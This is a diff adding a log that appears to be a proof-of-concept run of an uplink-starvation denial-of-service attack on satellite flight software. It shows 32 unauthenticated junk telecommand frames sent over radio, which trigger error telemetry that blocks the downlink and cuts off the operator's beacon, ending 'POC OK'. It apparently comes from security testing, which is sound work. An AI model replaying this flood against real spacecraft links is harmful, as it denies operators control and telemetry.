@@ -1,0 +1,82 @@
+[   0.000] ========================================================================
+[   0.000] V-15 uplink starvation DoS
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.001] <-- TM apid=0x09 AES len=17
+[   0.001] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.002] <-- TM apid=0x09 AES len=17
+[   0.002] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.003] <-- TM apid=0x09 AES len=17
+[   0.003] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.004] <-- TM apid=0x09 AES len=17
+[   0.004] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.005] <-- TM apid=0x09 AES len=17
+[   0.005] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.006] <-- TM apid=0x09 AES len=17
+[   0.006] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.007] <-- TM apid=0x09 AES len=17
+[   0.007] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.008] <-- TM apid=0x09 AES len=17
+[   0.008] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.009] <-- TM apid=0x09 AES len=17
+[   0.009] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.010] <-- TM apid=0x09 AES len=17
+[   0.010] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.010] <-- TM apid=0x09 AES len=17
+[   0.010] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.011] <-- TM apid=0x09 AES len=17
+[   0.011] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.012] <-- TM apid=0x09 AES len=17
+[   0.012] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.013] <-- TM apid=0x09 AES len=17
+[   0.013] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.014] <-- TM apid=0x09 AES len=17
+[   0.014] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.015] <-- TM apid=0x09 AES len=17
+[   0.015] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.015] <-- TM apid=0x09 AES len=17
+[   0.015] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.016] <-- TM apid=0x09 AES len=17
+[   0.016] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.017] <-- TM apid=0x09 AES len=17
+[   0.017] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.018] <-- TM apid=0x09 AES len=17
+[   0.018] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.019] <-- TM apid=0x09 AES len=17
+[   0.019] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.020] <-- TM apid=0x09 AES len=17
+[   0.020] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.020] <-- TM apid=0x09 AES len=17
+[   0.020] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.021] <-- TM apid=0x09 AES len=17
+[   0.021] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.022] <-- TM apid=0x09 AES len=17
+[   0.022] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.023] <-- TM apid=0x09 AES len=17
+[   0.023] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.024] <-- TM apid=0x09 AES len=17
+[   0.024] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.025] <-- TM apid=0x09 AES len=17
+[   0.025] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.026] <-- TM apid=0x09 AES len=17
+[   0.026] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.026] <-- TM apid=0x09 AES len=17
+[   0.026] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.027] <-- TM apid=0x09 AES len=17
+[   0.027] --> TC apid=0x01 via=radio clear payload=ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+[   0.028] <-- TM apid=0x09 AES len=17
+[   0.028] 32/32 junk frames -> error TMs (each also AES-wrapped)
+[   0.028] --> TC apid=0x28 via=radio AES  payload=-
+[   0.029] <-- TM apid=0x09 AES len=19
+[   0.029] downlink occupied: 8.4 s TX + 53-66 s of blocking blink in the command loop -> 18 s beacon cadence lost, no TM delivered during the stall
+[   0.029] --> TC apid=0x05 via=usb AES  payload=01
+[   0.029] --> advance(3000 ms)
+[   0.030] <-- TM apid=0x01 AES len=64
+[   0.031] <-- TM apid=0x01 AES len=64
+[   0.032] <-- TM apid=0x01 AES len=64
+[   0.032] --> TC apid=0x0C via=usb AES  payload=-
+[   0.033] <-- TM apid=0x0C AES len=27
+[   0.033] => attacker jams the OPERATOR's own telemetry with 33 valid-format frames
+[   0.033] ========================================================================
+[   0.033] POC OK
+[   0.033] ========================================================================
